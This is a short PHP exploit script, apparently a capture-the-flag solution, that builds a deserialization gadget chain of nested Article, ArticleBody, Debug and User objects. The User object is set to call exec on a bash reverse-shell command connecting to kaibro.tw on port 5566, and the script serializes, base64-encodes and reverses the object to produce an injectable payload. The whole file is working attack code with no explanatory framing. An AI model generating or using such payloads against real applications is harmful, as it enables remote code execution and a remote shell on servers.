<?php

class Article {
    public $author = "1";
    public $data = "0";
    public $body;
}

class ArticleBody {
    public $title;
    public $content;
}

class Debug {
    public $msg = "Debug hacked";
    public $fm = "";
}

class User {
    public $func = "";
    public $data = "";
}

$user = new User();
$user -> func = "\\exec";
$user -> data = "bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'";

$debug = new Debug();
$debug -> fm = $user;

$articleBody = new ArticleBody();
$articleBody -> title = $debug;
$articleBody -> content = $debug;

$article = new Article();
$article -> body = $articleBody;

/*
$s = serialize($article);
echo $s;
echo "</br>";
*/

echo strrev(base64_encode("1|" . serialize($article)));

?>

